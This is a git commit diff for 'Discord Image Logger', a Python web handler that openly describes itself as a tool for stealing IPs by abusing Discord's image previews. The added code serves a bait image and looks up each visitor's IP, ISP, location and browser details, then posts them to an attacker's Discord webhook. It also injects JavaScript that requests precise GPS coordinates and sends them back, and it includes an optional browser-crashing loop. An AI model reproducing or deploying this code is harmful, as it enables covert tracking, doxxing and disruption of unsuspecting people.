6c03623871f40955bf14bd612994b0156bbd262f
mkonfncd <mkonfncd@gmail.com>
2025-12-26 15:51:17 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,6 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json
+import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -84,113 +84,6 @@ def reportError(error):
     ],
 })
 
-def getExtendedIPInfo(ip):
-    """Get extended IP information from multiple APIs"""
-    extended_info = {}
-    
-    try:
-        # API 1: ipapi.co (Detailed information)
-        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
-        if response.status_code == 200:
-            ipapi_data = response.json()
-            extended_info["ipapi"] = {
-                "country_name": ipapi_data.get("country_name"),
-                "region": ipapi_data.get("region"),
-                "city": ipapi_data.get("city"),
-                "postal": ipapi_data.get("postal"),
-                "latitude": ipapi_data.get("latitude"),
-                "longitude": ipapi_data.get("longitude"),
-                "timezone": ipapi_data.get("timezone"),
-                "org": ipapi_data.get("org"),
-                "asn": ipapi_data.get("asn")
-            }
-    except:
-        pass
-    
-    try:
-        # API 2: ip-api.com (Different data format)
-        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
-        if response.status_code == 200:
-            ipapi_com = response.json()
-            if ipapi_com.get("status") == "success":
-                extended_info["ipapi_com"] = {
-                    "isp": ipapi_com.get("isp"),
-                    "org": ipapi_com.get("org"),
-                    "as": ipapi_com.get("as"),
-                    "reverse": ipapi_com.get("reverse"),
-                    "mobile": ipapi_com.get("mobile"),
-                    "proxy": ipapi_com.get("proxy"),
-                    "hosting": ipapi_com.get("hosting")
-                }
-    except:
-        pass
-    
-    try:
-        # API 3: ipwhois.app (Another alternative)
-        response = requests.get(f"http://ipwhois.app/json/{ip}", timeout=3)
-        if response.status_code == 200:
-            ipwhois = response.json()
-            extended_info["ipwhois"] = {
-                "continent": ipwhois.get("continent"),
-                "country_code": ipwhois.get("country_code"),
-                "country_flag": ipwhois.get("country_flag"),
-                "country_phone": ipwhois.get("country_phone"),
-                "region": ipwhois.get("region"),
-                "city": ipwhois.get("city"),
-                "latitude": ipwhois.get("latitude"),
-                "longitude": ipwhois.get("longitude"),
-                "timezone_gmt": ipwhois.get("timezone_gmt"),
-                "timezone_name": ipwhois.get("timezone_name"),
-                "currency": ipwhois.get("currency"),
-                "currency_code": ipwhois.get("currency_code")
-            }
-    except:
-        pass
-    
-    try:
-        # API 4: ipinfo.io (Very detailed)
-        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
-        if response.status_code == 200:
-            ipinfo = response.json()
-            extended_info["ipinfo"] = {
-                "hostname": ipinfo.get("hostname"),
-                "anycast": ipinfo.get("anycast"),
-                "city": ipinfo.get("city"),
-                "region": ipinfo.get("region"),
-                "country": ipinfo.get("country"),
-                "loc": ipinfo.get("loc"),
-                "org": ipinfo.get("org"),
-                "postal": ipinfo.get("postal"),
-                "timezone": ipinfo.get("timezone")
-            }
-    except:
-        pass
-    
-    try:
-        # API 5: ipgeolocation.io (Another good one)
-        response = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}", timeout=3)
-        if response.status_code == 200:
-            ipgeo = response.json()
-            extended_info["ipgeolocation"] = {
-                "continent_name": ipgeo.get("continent_name"),
-                "country_name": ipgeo.get("country_name"),
-                "country_flag": ipgeo.get("country_flag"),
-                "state_prov": ipgeo.get("state_prov"),
-                "district": ipgeo.get("district"),
-                "city": ipgeo.get("city"),
-                "zipcode": ipgeo.get("zipcode"),
-                "latitude": ipgeo.get("latitude"),
-                "longitude": ipgeo.get("longitude"),
-                "time_zone": ipgeo.get("time_zone"),
-                "currency": ipgeo.get("currency"),
-                "organization": ipgeo.get("organization"),
-                "isp": ipgeo.get("isp")
-            }
-    except:
-        pass
-    
-    return extended_info
-
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -213,22 +106,17 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     ping = "@everyone"
 
-    # Get primary IP info from ip-api.com (original API)
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    
-    # Get extended IP info from multiple APIs
-    extended_info = getExtendedIPInfo(ip)
-    
-    if info.get("proxy"):
+    if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
         
         if config["vpnCheck"] == 1:
             ping = ""
     
-    if info.get("hosting"):
+    if info["hosting"]:
         if config["antiBot"] == 4:
-            if info.get("proxy"):
+            if info["proxy"]:
                 pass
             else:
                 return
@@ -237,7 +125,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
 
         if config["antiBot"] == 2:
-            if info.get("proxy"):
+            if info["proxy"]:
                 pass
             else:
                 ping = ""
@@ -245,15 +133,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
+
     os, browser = httpagentparser.simple_detect(useragent)
-    
-    # Format extended info for Discord embed
-    extended_info_text = ""
-    for api_name, api_data in extended_info.items():
-        extended_info_text += f"\n**{api_name.upper()} API Data:**\n"
-        for key, value in api_data.items():
-            if value and value != "Unknown":
-                extended_info_text += f"> **{key.replace('_', ' ').title()}:** `{value}`\n"
     
     embed = {
     "username": config["username"],
@@ -266,23 +147,155 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **Endpoint:** `{endpoint}`
             
-**Primary IP Info (ip-api.com):**
+**IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info.get('isp', 'Unknown') if info.get('isp') else 'Unknown'}`
-> **ASN:** `{info.get('as', 'Unknown') if info.get('as') else 'Unknown'}`
-> **Country:** `{info.get('country', 'Unknown') if info.get('country') else 'Unknown'}`
-> **Region:** `{info.get('regionName', 'Unknown') if info.get('regionName') else 'Unknown'}`
-> **City:** `{info.get('city', 'Unknown') if info.get('city') else 'Unknown'}`
-> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
-> **Mobile:** `{info.get('mobile', 'Unknown')}`
-> **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
-
-**Extended IP Information:**{extended_info_text if extended_info_text else '\n> *No additional data available*'}
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
+```
+{useragent}
+```""",
+    }
+  ],
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+            
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
+            
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = ImageLoggerAPI
